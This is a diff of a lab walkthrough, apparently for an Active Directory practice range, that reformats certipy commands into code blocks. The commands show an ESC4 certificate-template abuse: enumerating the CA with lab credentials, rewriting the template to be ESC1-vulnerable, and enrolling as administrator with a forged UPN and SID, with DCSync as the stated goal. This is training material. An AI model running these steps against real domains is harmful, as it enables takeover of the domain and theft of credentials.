@@ -63,8 +63,11 @@ are N/A on this build.
 ## Step 1 - Enumerate the CA + templates
 <!-- lab-requires: meereen -->
 
-- [x] `certipy find -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12
-  -vulnerable -stdout`. `✅` Found **ESSOS-CA** (Web Enrollment disabled; SAN
+- [x] Enumerate the CA and its templates:
+  ```bash
+  certipy find -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -vulnerable -stdout
+  ```
+  `✅` Found **ESSOS-CA** (Web Enrollment disabled; SAN
   enabled; Request Disposition Issue), vulnerable to **ESC6** ("does not work
   after May 2022") and **ESC11**; template **ESC4** where `khal.drogo` has Full
   Control. Template set: ESC4 + **ESC13** (not mayfly's ESC1/2/3).
@@ -75,8 +78,11 @@ are N/A on this build.
 khal.drogo can rewrite the ESC4 template, so make it ESC1-vulnerable, enroll as
 `administrator`, and DCSync.
 
-- [x] **2.1** `certipy template -template ESC4 -save-old` (rewrite vulnerable,
-  keep the old config). `✅`
+- [x] **2.1** rewrite ESC4 to be vulnerable, keeping the old config:
+  ```bash
+  certipy template -template ESC4 -save-old
+  ```
+  `✅`
 - [x] **2.2** `certipy req … -template ESC4 -ca ESSOS-CA -upn
   administrator@essos.local -sid <admin SID>`. `✅` - **the `-sid` is required**:
   without it, auth fails `Object SID mismatch` (KB5014754, May-2022 strong
